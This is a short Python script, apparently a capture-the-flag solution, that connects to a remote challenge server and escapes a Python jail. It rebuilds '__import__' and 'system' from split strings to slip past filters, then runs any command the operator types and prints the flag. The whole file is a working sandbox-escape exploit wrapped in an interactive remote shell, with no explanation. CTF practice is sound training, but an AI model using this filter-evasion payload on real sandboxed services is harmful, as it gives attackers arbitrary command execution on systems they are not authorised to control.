from pwn import *

r = remote("inst.ctf.gdgalgiers.com", 30856)
r.recvuntil(">>> ")


def execute(cmd):
    payload = ""
    payload += "vars(__builtins__)['__imp' + 'ort__']"
    payload += "('o' + 's').__dict__['sys' + 'tem']"
    payload += f"('{cmd} 1>&2; cat flag')"
    print(payload)
    r.sendline(payload.encode())
    data = b"\n".join(r.recvuntil(">>> ").split(b"\n")[:-3])
    print(data.decode('latin-1'))

while True:
    cmd = input("# ")
    execute(cmd.strip())
